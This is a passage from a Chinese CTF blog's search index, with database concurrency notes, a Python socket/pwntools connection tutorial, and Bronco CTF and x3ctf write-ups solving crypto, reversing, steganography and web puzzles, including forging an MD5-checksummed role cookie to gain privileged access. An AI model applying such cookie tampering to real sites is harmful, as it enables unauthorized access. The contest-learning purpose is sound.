Ti 必须回滚。 若 TS(Ti)&lt;writeTS(A)，说明 Ti 试图覆盖一个更新的值，必须回滚。 否则，Ti可以写入，并更新 writeTS(A) = TS(Ti)。 Optimistische Synchronisation Lesephase Validierungsphase（验证） Schreibphase Snapshot Isolation Synchronisation von Indexstrukturen: zu aufwendig, redundante Transaktionsverwaltung in SQL92isolation level: read uncommited read commited repeatable read serializable","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"Dantenbank 数据库","slug":"TUM-info-课程笔记/Dantenbank-数据库","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Dantenbank-%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/en/tags/SQL/"},{"name":"Datenbank","slug":"Datenbank","permalink":"https://archer-baiyi.github.io/en/tags/Datenbank/"},{"name":"Database","slug":"Database","permalink":"https://archer-baiyi.github.io/en/tags/Database/"},{"name":"数据库","slug":"数据库","permalink":"https://archer-baiyi.github.io/en/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"与服务器的交互","slug":"CTF/General/与服务器的交互","date":"2025-03-10T19:22:29.000Z","updated":"2025-07-10T10:51:33.356Z","comments":true,"path":"2025/03/10/CTF/General/与服务器的交互/","permalink":"https://archer-baiyi.github.io/en/2025/03/10/CTF/General/%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E4%BA%A4%E4%BA%92/","excerpt":"使用socket.socket()与remote（）连接服务器","text":"socket.socketsocket 是 Python 标准库中的模块，用于进行 TCP/UDP 连接。 假设服务器地址是 example.com，端口是 1234： 123456789101112131415161718192021import socket# 1. 创建一个TCP sockets = socket.socket()# 2. 连接远程服务器# connect的参数要求为一个tupels.connect((&quot;example.com&quot;, 1234))# 3. 发送数据（例如发送 &quot;Hello&quot;）# sendall() 默认发送的是 bytes 类型的数据，所以需要 b&quot;&quot; 或者 &quot;&quot;.encodes.sendall(b&quot;Hello\\n&quot;)# 4. 接收服务器返回的数据# 这个参数按需调节就好data = s.recv(1024) # 一次接收 1024 字节print(&quot;Received:&quot;, data.decode())# 5. 关闭连接s.close() 如果服务器会发送非常多的内容，则需要一直循环接收服务器发送的消息： 123456789101112131415161718192021import sockets = socket.socket()s.connect((&quot;example.com&quot;, 1234))# 持续接收数据，直到服务器关闭连接data = b&quot;&quot; # 用于存储完整的接收数据while True: part = s.recv(1024) # 每次读取 1024 字节 if not part: # 如果 part 为空，表示服务器关闭连接 break data += part # 累加数据# 按行分割并逐行打印lines = data.decode().splitlines()for line in lines: print(line)s.close() 也可以使用time.sleep()来确保收到完整信息： 12345678910111213141516import socketimport times = socket.socket()s.connect((&quot;example.com&quot;, 1234))s.sendall(b&quot;Hello\\n&quot;)time.sleep(0.5)data = s.recv(1024)print(&quot;Received:&quot;, data.decode())s.close() SSL连接 SSL 连接会比普通的TCP连接（socket.socket()）多一步加密的步骤 123456789101112131415161718import socketimport sslsock = socket.socket()# 使用 SSL 加密 sockets = ssl.wrap_socket(sock)s.connect((&quot;example.com&quot;, 1234))s.sendall(b&quot;Hello\\n&quot;)data = s.recv(1024)print(&quot;Received:&quot;, data.decode())s.close() pwntools的remotepwntools 是专门为 Pwn 题目设计的 Python 库，封装了 socket。 123456789101112131415from pwn import *# 1. 连接服务器r = remote(&quot;example.com&quot;, 1234)# 2. 发送数据r.sendline(b&quot;Hello&quot;) # 自动添加 &#x27;\\n&#x27;# 3. 接收数据response = r.recvall() # 读取所有信息# response = r.recvline() # 读取一整行print(&quot;Received:&quot;, response.decode())# 4. 关闭连接r.close() 比起socket，pwn拥有更高级的功能： 12345678910r.recvuntil(b&quot;\\n&quot;) #一直读数据，直到匹配特定字符串。# p.recvuntil(b&quot;Enter your name:&quot;)r.interactive() # 进入交互模式#比如说在pwn的题目里如果成功打开了shell（system(&quot;/bin/sh&quot;)），进入交互模式则可以直接手动执行命令。response = r.recvall()# recvall会自动读取所有可用数据 直到服务器关闭连接。不再需要像原生 socket 那样手写 while True 循环。r.sendafter(b&quot;input:&quot;, b&quot;1234&quot;) # 先等待服务器发送 input:，然后再发送 1234 remote() 里也可以启用 SSL： 12345678910from pwn import *r = remote(&quot;example.com&quot;, 1234, ssl=True) # 开启 SSL 加密r.sendline(b&quot;Hello&quot;) # 自动添加 &#x27;\\n&#x27;response = r.recvline()print(&quot;Received:&quot;, response.decode())r.close() 总的来说，在做CTF题目时，pwn的remote可以完成所有与服务器的交互。 socket.socket没有的remote有，socket.socket没有的remote也有。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"General","slug":"CTF/General","permalink":"https://archer-baiyi.github.io/en/categories/CTF/General/"}],"tags":[{"name":"socket","slug":"socket","permalink":"https://archer-baiyi.github.io/en/tags/socket/"},{"name":"remote","slug":"remote","permalink":"https://archer-baiyi.github.io/en/tags/remote/"}]},{"title":"Bronco CTF Write Up","slug":"CTF/比赛Writeup/Bronco-CTF-Write-Up","date":"2025-03-10T12:28:52.000Z","updated":"2025-11-29T21:38:32.221Z","comments":true,"path":"2025/03/10/CTF/比赛Writeup/Bronco-CTF-Write-Up/","permalink":"https://archer-baiyi.github.io/en/2025/03/10/CTF/%E6%AF%94%E8%B5%9BWriteup/Bronco-CTF-Write-Up/","excerpt":"Bronco CTF比赛的题解，涉及方向：Crypto, Web, Reverse, Steg, Misc, Forensics","text":"BeginnerBreak the Battalion 这道题我们会拿到一份ELF文件，我们用IDA打开它会看到 可以发现，这个程序的核心内容是encrypt，所以我们查看一下它的内容： 写一段python便可以简单得知输入什么内容最后会输出“brigade”： 12345678def decrypt(encrypted): return &#x27;&#x27;.join(chr(ord(c) ^ 0x50) for c in encrypted)encrypted = &quot;brigade&quot;original_input = decrypt(encrypted)print(f&quot;Original input: &#123;original_input&#125;&quot;)# Original input: 2&quot;97145 所以flag为： 1bronco&#123;2&quot;97145&#125; (吐槽一下，这个flag的内容真的非常奇怪，一般都是会带点正常单词的。) Simon Says 这道题我们会拿到这样一张图片： 并没有任何有用的内容。根据题目描述我们猜测这道题用了LSB隐写，所以用Stegsolve打开图片便可得到： flag为： 1bronco&#123;simon_says_submit_this_flag&#125; Too Many Emojis这道题我们会得到一串emoji内容： 因为知道flag的格式为bronco{}，所以可以确定这个应该是单表加密，并且知道前6个emoji对应的明文。 经过一系列搜索与排查可以发现每一个emoji对应的字母为这个emoji的官方英文名的首字母，根据这个线索我们可以通过找到的这些信息来解密内容： （用到的网站：https://unicode.org/emoji/charts/full-emoji-list.html） 这里有一个小技巧：如果找不到想要的 emoji，可以描述给 ChatGPT 并询问其官方名称，再到网站上用名称（或部分名称）搜索，确认是否是我们需要的。 最后得到flag： 1bronco&#123;emojis_express_my_emotions&#125; Straight Up Circular 这道题给出的加密字符串如下： 1dvlby_otspnr&#123;cobrnot450i1nm_e03&#125; 首先，通过 &#123;&#125; 的位置，我们可以判断这并不是替换加密。其次，我们发现 bronco&#123;&#125;（该比赛的 flag 统一格式）中的每个字母和符号都出现在了这串字符串中，因此很可能是某种乱序加密。 先确定 b、r、o 等字母在加密字符串中的具体位置，再根据题目名字（Straight Up Circular）不难发现这个用这个规律可以得到的flag开头： 从字符串正中间的 b 出发 先向右移动 1 位 再向左移动 2 位 接着向右移动 3 位 依此类推…… 继续这个流程便可以成功获得flag： 1bronco&#123;tr4n5p0sit1on_my_bel0v3d&#125; CryptoAcross the Tracks 我们会得到一段内容： 1Samddre··ath·dhf@_oesoere·ebun·yhot·no··oso·i·a·lr1rcm·iS·aruf·toibadhn·nadpikudynea&#123;l_oeee·ch·oide·f·n·aoe·sae·aonbdhgo_so·rr.i·tYnl·s·tdot·xs·hdtyy&#x27;·.t·cfrlca·epeo·iufiyi.t·yaaf·.a.·ts··tn33&#125;i·tvhr·.tooho···rlmwuI·h·e·iHshonppsoleaseecrtudIdet.·n·BtIpdheiorcihr·or·ovl·c··i·acn·t·su··ootr·:b3cesslyedheIath·e·_ 根据题目描述我们猜测这段内容使用了栅栏密码，并且key为题目描述中提到的“tenth”（10）。解密即可得到flag： 1bronco&#123;r@1l_f3nc3_cip3rs_r_cool&#125; Rahhh-SA 这道题我们会得到以下内容： 1234e = 65537n = 3429719c = [-53102, -3390264, -2864697, -3111409, -2002688, -2864697, -1695722, -1957072, -1821648, -1268305, -3362005, -712024, -1957072, -1821648, -1268305, -732380, -2002688, -967579, -271768, -3390264, -712024, -1821648, -3069724, -732380, -892709, -271768, -732380, -2062187, -271768, -292609, -1599740, -732380, -1268305, -712024, -271768, -1957072, -1821648, -3418677, -732380, -2002688, -1821648, -3069724, -271768, -3390264, -1847282, -2267004, -3362005, -1764589, -293906, -1607693]p = -811 首先注意到c的所有内容都是负数，但是其绝对值都小于等于n，所有猜测将其直接放进 $\\mathbb{Z}/n\\mathbb{Z}$ 进行计算即可。但因为发现$p’ := n+p = 3,428,908$ 并不是n的因数，所以尝试 $3429719/811=4229$ ，发现结果为整数。 所以写一段python代码来尝试RSA解码即可： 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python3e = 65537n = 3429719p = 811 # 题中写的是 -811，这里只取绝对值q = n // p # 4229# 计算 phi(n)phi = (p - 1) * (q - 1) # (811 - 1)*(4229 - 1) = 810*4228 = 3424680# 求 d = e^-1 mod phi(n)# Python 3.8+ 可以直接用 pow(e, -1, phi) 得到模逆d = pow(e, -1, phi)# 给出的负数密文c_list = [ -53102, -3390264, -2864697, -3111409, -2002688, -2864697, -1695722, -1957072, -1821648, -1268305, -3362005, -712024, -1957072, -1821648, -1268305, -732380, -2002688, -967579, -271768, -3390264, -712024, -1821648, -3069724, -732380, -892709, -271768, -732380, -2062187, -271768, -292609, -1599740, -732380, -1268305, -712024, -271768, -1957072, -1821648, -3418677, -732380, -2002688, -1821648, -3069724, -271768, -3390264, -1847282, -2267004, -3362005, -1764589, -293906, -1607693]# 解密plaintext_nums = []for c in c_list: # 先把负数转为 mod n 内的非负代表元 c_mod = c % n m = pow(c_mod, d, n) plaintext_nums.append(m)message = &#x27;&#x27;.join(chr(m) for m in plaintext_nums)print(&quot;解密后得到的数值:&quot;, plaintext_nums)print(&quot;尝试映射到字符后的结果:&quot;)print(message)# bronco&#123;m4th3m4t1c5_r34l1y_1s_qu1t3_m4g1c4l_raAhH!&#125; WebGrandma’s Secret Recipe （因为这份食谱离婚了实在是有点抽象） 点击网站可以看到： 点开Cookie可以发现有2条内容： 12checksum: a223befb6660a23f9c3491f74ef84e43role: &quot;kitchen helper&quot; 结果检查发现checksum为role的md5结果： 所以我们将role改为：”grandma”，并且将checksum改为a5d19cdd5fd1a8f664c0ee2b5e293167（=md5(grandma))。点击“Grandma’s Pantry“便可以看到： 得到flag： 1bronco&#123;grandma-makes-b3tter-cookies-than-girl-scouts-and-i-w1ll-fight-you-over-th@t-fact&#125; ReverseReversing for Ophidiophiles 这道题我们会得到以下内容： 123a326c27bee9b40885df97007aa4dbe410e93 1234567891011121314flag = input()carry = 0key = &quot;Awesome!&quot;output = []for i,c in enumerate(flag): val = ord(c) val += carry val %= 256 val ^= ord(key[i % len(key)]) output.append(val) carry += ord(c) carry %= 256print(bytes(output).hex()) 直接用python写一段逆向的算法便可以得到flag： 123456789101112131415encrypted_hex = &quot;23a326c27bee9b40885df97007aa4dbe410e93&quot;encrypted_bytes = bytes.fromhex(encrypted_hex)carry = 0key = &quot;Awesome!&quot;flag = []for i, val in enumerate(encrypted_bytes): val ^= ord(key[i % len(key)]) # 逆向 XOR 操作 val = (val - carry + 256) % 256 # 逆向 carry 计算 flag.append(chr(val)) carry = (carry + val) % 256 # 重新计算 carry 值print(&quot;&quot;.join(flag))# bronco&#123;charge_away&#125; theflagishere! 这道题我们会得到一份Python 编译后的字节码文件 “theflagishere.pyc”，我们首先用这个网站将其反汇编： https://www.lddgo.net/string/pyc-compile-decompile 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129# Visit https://www.lddgo.net/string/pyc-compile-decompile for more information# Version : Python 3.9def what_do_i_do(whoKnows): a_st = &#123; &#125; for a in whoKnows: if a_st.get(a) == None: a_st[a] = 1 continue a_st[a] += 1 variable_name = 0 not_a_variable_name = &#x27;None&#x27; for a in a_st: if a_st[a] &gt; variable_name: not_a_variable_name = a variable_name = a_st[a] continue return (not_a_variable_name, variable_name)def char_3(): return &#x27;m&#x27;def i_definitely_return_the_flag(): def notReal(): def actually_real(): return &#x27;actuallyaflag&#x27; return actually_real def realFlag(): return &#x27;xXx___this__is_the__flag___xXx&#x27; return (realFlag, notReal)def i_am_a_function_maybe(param): variableName = (param + 102) * 47 for i in range(0, 100): variableName *= i + 1 variableName /= i + 1 newVariable = variableName * i newVariable += 100 return chr(ord(chr(int(variableName) + 1)))def i_do_not_know(): realFlagHere = &#x27;br0nc0s3c_fl4g5_4r3_345y&#x27; return &#x27;long_live_long_flags&#x27;def unrelated_statement(): return &#x27;eggs_go_great_with_eggs&#x27;def i_am_a_function(param): variableName = (param + 102) * 47 for i in range(0, 100): variableName *= i + 1 newVariable = variableName * i newVariable += 100 variableName /= i + 1 return chr(ord(chr(int(variableName))))def i_return_a_helpful_function(): def i_do_something(char): var = [] for i in range(54, 2000): var.append(ord(char) / 47 - 102) var.reverse() return var.pop() return i_do_somethingdef i_return_the_flag(): return &#x27;thisisdefinitelytheflag!&#x27;def i(): return &#x27;free_flag_f&#x27;def char_0(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_return_the_flag())[0]))def char_1_4_6(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[0]())[0]))def char_2_5_9(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[1]()())[0]))def char_7(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(interesting()()()()())[0]))def char_8(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_do_not_know())[0]))def char_10(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(unrelated_statement())[0]))def interesting(): def notinteresting(): def veryuninteresting(): def interesting_call(): return i return interesting_call return veryuninteresting return notinteresting 然后用python写一段逆向的脚本即可得到flag （主要内容其实就是复制粘贴）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105def what_do_i_do(whoKnows): a_st = &#123;&#125; for a in whoKnows: if a_st.get(a) is None: a_st[a] = 1 continue a_st[a] += 1 variable_name = 0 not_a_variable_name = &#x27;None&#x27; for a in a_st: if a_st[a] &gt; variable_name: not_a_variable_name = a variable_name = a_st[a] return (not_a_variable_name, variable_name)def i_definitely_return_the_flag(): def notReal(): def actually_real(): return &#x27;actuallyaflag&#x27; return actually_real def realFlag(): return &#x27;xXx___this__is_the__flag___xXx&#x27; return (realFlag, notReal)def i_do_not_know(): realFlagHere = &#x27;br0nc0s3c_fl4g5_4r3_345y&#x27; return &#x27;long_live_long_flags&#x27;def unrelated_statement(): return &#x27;eggs_go_great_with_eggs&#x27;def interesting(): def notinteresting(): def veryuninteresting(): def interesting_call(): return i return interesting_call return veryuninteresting return notinterestingdef i(): return &#x27;free_flag_f&#x27;def i_return_a_helpful_function(): def i_do_something(char): var = [] for i in range(54, 2000): var.append(ord(char) / 47 - 102) var.reverse() return var.pop() return i_do_somethingdef i_am_a_function_maybe(param): variableName = (param + 102) * 47 for i in range(0, 100): variableName *= i + 1 variableName /= i + 1 newVariable = variableName * i newVariable += 100 return chr(ord(chr(int(variableName) + 1)))def char_0(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_return_the_flag())[0]))def char_1_4_6(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[0]())[0]))def char_2_5_9(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[1]()())[0]))def char_3(): return &#x27;m&#x27;def char_7(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(interesting()()()()())[0]))def char_8(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_do_not_know())[0]))def char_10(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(unrelated_statement())[0]))def i_return_the_flag(): return &#x27;thisisdefinitelytheflag!&#x27;# 拼接 flagflag = ( char_0() + char_1_4_6() + char_2_5_9() + char_3() + char_1_4_6() + char_2_5_9() + char_1_4_6() + char_7() + char_8() + char_2_5_9() + char_10())print(&quot;Recovered flag:&quot;, flag)# i_am_a_flag# bronco&#123;i_am_a_flag&#125; ForensicsQR Coded 这道题我们会得到一张二维码： 直接扫描（https://scanqr.org/）会得到一个fake flag： 用Stegsolve打开并调整到Gray bits会得到另外一张二维码： 扫描后会得到真正的flag： 1bronco&#123;th1s_0n3_i5&#125; Uno 这道题我们会得到这样一张图片： 根据题目描述（”a significant bit of the cards were left on the plane I was on.“）我们猜测这道题用的是LSB隐写了ASCII码，所以我们用StegSolve打开图片，利用其Data Extract模块进行查看。这个模块可以查看RGB三种颜色的每一个通道，并且按照（自选的）一定的排列顺序显示每个通道的Hex和ASCII码字符： 最后，根据题目描述中的 “the numbers really speak to me…” 这一句，尝试各种由 2、3、4、5 组成的组合，便可以得到 flag： 1bronco&#123;no_un0_y3t&#125; Wordlands 我们会得到这张图片： 经过一番尝试后，当用StegSolve打开图片，利用其Data Extract模块进行查看时可以发现： 8BPS是标准的Photoshop 的.psd 文件有固定的文件头，所以我们点击“Save Bin”将其存为wordlands.psd，并用这个网站打开它： https://www.photopea.com/ 可以发现这里有所有图片创作的信息（图层之类的）。最后根据line的图层的顺序进行拼接便可以得到flag： 比如说Shape1这个图层里的线连接了b和r，表示开头为br 然后是(b)ro，以此类推… 1bronco&#123;i_love_admiring_beautiful_winter_landscapes&#125; MiscTick Tock 这道题我们首先会得到这张图片： 经过多次尝试可以在StegSolve的Data Extract模块里发现有一长串由“tick”和“tock”组成的内容： 1ticktocktocktockticktickticktock ticktocktocktickticktocktocktock ticktocktocktickticktockticktick ticktocktockticktickticktocktock ticktocktocktocktickticktocktick ticktocktocktickticktockticktick ticktocktocktocktockticktocktock ticktocktocktockticktockticktock ticktocktocktocktocktickticktick ticktocktockticktockticktocktock ticktocktocktockticktockticktick ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktockticktickticktocktock ticktocktockticktockticktocktick ticktocktockticktocktickticktock ticktocktocktockticktockticktick ticktocktockticktocktickticktick ticktockticktocktocktocktocktock ticktocktockticktockticktocktick ticktocktockticktickticktocktock ticktocktockticktocktickticktock ticktocktocktocktocktickticktick ticktocktocktickticktickticktock ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktocktocktickticktocktock ticktocktockticktickticktocktock ticktocktocktocktocktickticktick ticktocktocktockticktocktocktick ticktocktocktockticktocktocktock ticktocktockticktocktickticktock ticktocktocktocktocktockticktock 写一段python将tick替换成0，tock替换成1然后当成二进制内容进行解码会得到： 1234567891011121314151617def ticktock_to_binary(text): return text.replace(&quot;tick&quot;, &quot;0&quot;).replace(&quot;tock&quot;, &quot;1&quot;)text = &quot;ticktocktocktockticktickticktock ticktocktocktickticktocktocktock ticktocktocktickticktockticktick ticktocktockticktickticktocktock ticktocktocktocktickticktocktick ticktocktocktickticktockticktick ticktocktocktocktockticktocktock ticktocktocktockticktockticktock ticktocktocktocktocktickticktick ticktocktockticktockticktocktock ticktocktocktockticktockticktick ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktockticktickticktocktock ticktocktockticktockticktocktick ticktocktockticktocktickticktock ticktocktocktockticktockticktick ticktocktockticktocktickticktick ticktockticktocktocktocktocktock ticktocktockticktockticktocktick ticktocktockticktickticktocktock ticktocktockticktocktickticktock ticktocktocktocktocktickticktick ticktocktocktickticktickticktock ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktocktocktickticktocktock ticktocktockticktickticktocktock ticktocktocktocktocktickticktick ticktocktocktockticktocktocktick ticktocktocktockticktocktocktock ticktocktockticktocktickticktock ticktocktocktocktocktockticktock&quot;text = text.replace(&quot; &quot;, &quot;&quot;)binary = ticktock_to_binary(text)print(binary)# 01110001 01100111 01100100 01100011 01110010 01100100 01111011 01110101 01111000 01101011 01110100 01011111 01100010 01111000 01100011 01101010 01101001 01110100 01101000 01011111 01101010 01100011 01101001 01111000 01100001 01011111 01100010 01111000 01110011 01100011 01111000 01110110 01110111 01101001 01111101content = &#x27;&#x27;.join(chr(int(binary[i:i+8], 2)) for i in range(0, len(binary), 8))print(content)# qgdcrd&#123;uxkt_bxcjith_jcixa_bxscxvwi&#125; 最后通过遍历凯撒密码便可以得到flag： 1bronco&#123;five_minutes_until_midnight&#125; 比赛官方GitHubhttps://github.com/SCUBroncoSec/BroncoCTF-2025-Public","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"比赛Writeup","slug":"CTF/比赛Writeup","permalink":"https://archer-baiyi.github.io/en/categories/CTF/%E6%AF%94%E8%B5%9BWriteup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/en/tags/writeup/"}]},{"title":"X3ctf2025 Write Up","slug":"CTF/比赛Writeup/X3ctf2025-Write-Up","date":"2025-03-10T12:25:08.000Z","updated":"2025-11-30T12:46:11.773Z","comments":true,"path":"2025/03/10/CTF/比赛Writeup/X3ctf2025-Write-Up/","permalink":"https://archer-baiyi.github.io/en/2025/03/10/CTF/%E6%AF%94%E8%B5%9BWriteup/X3ctf2025-Write-Up/","excerpt":"x3ctf比赛的题解，涉及方向：Misc, Crypto","text":"Miscp11n-trophy（签到题）:题目描述： 我们首先会得到这样一份证书： 第一题签到题的答案就是证书下面正中间的“This certificate does not grant the rank of Master”。 trophy-plus + trophy-plus64:这两道目描述一模一样 其中一个flag是藏在certificate周围一圈的位置： 人工将这些内容识别，再翻译成二进制然后解码就会得到flag 1234567891011121314151617181920212223242526272829303132def decode_binary(content, mapping): # Convert content to binary using the mapping binary_str = &#x27;&#x27;.join(mapping[char] for char in content if char in mapping) # Split the binary string into 8-bit chunks bytes_list = [binary_str[i:i+8] for i in range(0, len(binary_str), 8)] # Convert each 8-bit chunk to a character decoded_text = &#x27;&#x27;.join(chr(int(byte, 2)) for byte in bytes_list if len(byte) == 8) return decoded_text# Input stringc_1 = &quot;MVVVVMMMMMVVMMVVMVVMMMVVMVVVVMVVMVVM VMMV MV MVVVVVMVVMM VMM MMVVMMMV&quot;c_2 = &quot;MVVMM VMMMVVMVVVMMM VMMVVVMVVVMV MMM VMVVVVVMVVM VMVVMVVMVVVMMMVVMMMMMVVVMVVVM VMVVVVV&quot;c_3 = &quot;VMMMVVMMM VMMMVVMVVVVVM VMMV MMVVVMMMMMVVMMMVVMMVVMVVVVVM VMMM VMMVVMVVMMVVMMVVMMVVVM VMV MVVVMVVVVVM VM VM VMMVVMMV MMMVVMVVVVVMV MMMV MMVVMMMVVMVVM VMV MVVVMMMMMVVMMVVMMMVVMVVVVVM VMV MVVMVVMMVVMVVVM VMVVMVVM&quot;reversed_c_3 = c_3[::-1]c_4 = &quot;MMV MMVVMMMMMVVMMVVMMMVVMMVVVMVVMVVMMVVMMVVVVVM VMV MMVVVVMMV MMVVVMMM VMVVMMMVVVMVVM&quot;reversed_c_4 = c_4[::-1]c_5 = &quot;MMVVMMM VMVVMVVVMMVVMMVVVM VMVVVVVMVVMVVMMMMVVMMMMMVVMVVMMMVVVVVMV&quot;# mapping = &#123;&#x27;M&#x27;: &#x27;0&#x27;, &#x27;V&#x27;: &#x27;1&#x27;&#125;mapping1 = &#123;&#x27;M&#x27;: &#x27;1&#x27;, &#x27;V&#x27;: &#x27;0&#x27;&#125;mapping2 = &#123;&#x27;M&#x27;: &#x27;0&#x27;, &#x27;V&#x27;: &#x27;1&#x27;&#125;# print(decode_binary(c_1, mapping2)+decode_binary(c_2, mapping2) + decode_binary(c_3, mapping2) + decode_binary(c_4, mapping2) + decode_binary(c_5, mapping2) )print(decode_binary(c_1, mapping2)+decode_binary(c_2, mapping2) + decode_binary(reversed_c_3, mapping2) + decode_binary(reversed_c_4, mapping2) + decode_binary(c_5, mapping2) )# 输出结果：x3c&#123;i_d1dn&#x27;t_kn0w_mvm_c0uld_be_us3d_f0r_b1n4ry_3nc0d1ng_l0l&#125; 另外一个flag则是藏在右下角的勋章里： 人工将这些内容识别出来然后用base64进行解码即可。 内容大概为： 12345678910111213141516171819202122232425262728-----BEGIN CERTIFICATE-----MIIDyjCCAlCgAwIBAgISBKmF/S4TYSXpTzcor9eZJ/GrMAoGCCqGSM49BAMDMDIxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEwlMZXQncyBFbmNyeXB0MQswOQYDVQQDEwJFNjAeFw0yNTAxMDYyMDM2MDFaFw0yNTA0MDYyMDM2MDBaMEAxPjA8BgNVBAMMNXgzY3ttdTV0X2IzX2Zlbl90eXAxbmdfdGgxcl9ieV9oNG5kXzEzNzUxMDUzMDQyNDgzNjF9MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEcYu3flnEI2dttI5lQQmzRld72SDdBqCDtfto9pg5t/NFFIolkY8W8CryM9XlJEx3NAOGTgBoeUNTuWgiCseQeaOCAjYwggIyMA4GA1UdDwEB/wQEAwIHgDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwDAYDVR0TAQH/BAIwADAdBgNVRQ4EFgQUrbtyF28hjw8oIqwXpakw8t7J9jQwHwYDVR0jBBgwFoAUkydGmAOpUWiOmNbEQkjbI79YlNIwVQYIKwYBBQUHAQEESTBHMCEGCCsGAQUFBzABhhVodHRwOi8vZTYuby5sZW5jci5vcmcwIgYIKwYBBQUHMAKGFmh0dHA6Ly91Ni5pLmxlbmNyLm9yZy8wQAYDVR0RBDkwN4IleDNje2llNXRfYjNfZnVuX3R5cDFuZl90aDFzX2J5X2g0bmRfMTM3NTEwNTMwNDI0ODM2MX0wEwYDVR0gBAwwCjAIBgZngQwBAgEwggEDBgorBgEEAdZ5AgQCBIH0BIHxAO8AdQB9WR4S4XggexxhZ3xe/fjQhlw0oE6VnrkDL9kOjC55uAAAAZQ9inTEAAAEAwBGMEQCIENpWRg98SQo5JdzyjgnyFeUY0WnNVzn5NkdDA3bzeKbAiBsAkk3fe5esm7A0efsLN/EyFjEK/NBGqYxgOucgZheQwB2ABNK3xglmEIjeAxv70x6kaQWtyNJzlhXat+u2qfCq+AiAAAB1D2KdXoAAAQDAEcwRQIgBfU4pkiNyNsl+I6skjXz6qqu+mNoI4JvtDsoYxoI+ZoCIQCRiMQSCEwahN0ImXu3cwDeyM+AbNeve0VgSLMSUBdxvTAKBggghkjOPQQDAwNoADBlAjEAvxa6nSpUMl7NuDB/+LJfzTskR498vLoetnZuHo14J6d9zuFRGQ8Dk4w2aQNsbuVsAjB9fE6GJYBiebb4aHu/J2amych3KP//D951/CdmiV5PKZqXWWdpaQZL+pbmsXRa8rM=-----END CERTIFICATE----- 会有一些误差，所以最后提交flag时需要多试几次。 foundations （Osint）：题目描述： 使用https://archive.org/来搜索这个比赛网站的历史纪录内容 可以在这里发现最早的纪录是在2024年7月14日： 点进去会发现： x3CTF{m4yb3_w3ll_m4ke_4_ch4ll3nge_0u7_0f_7h1s} mvm： 打开下载文件会得到 12MMVMVMVVMMVMVMVVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVMVMMVMVVVMMMVMVMVVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVMVVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMV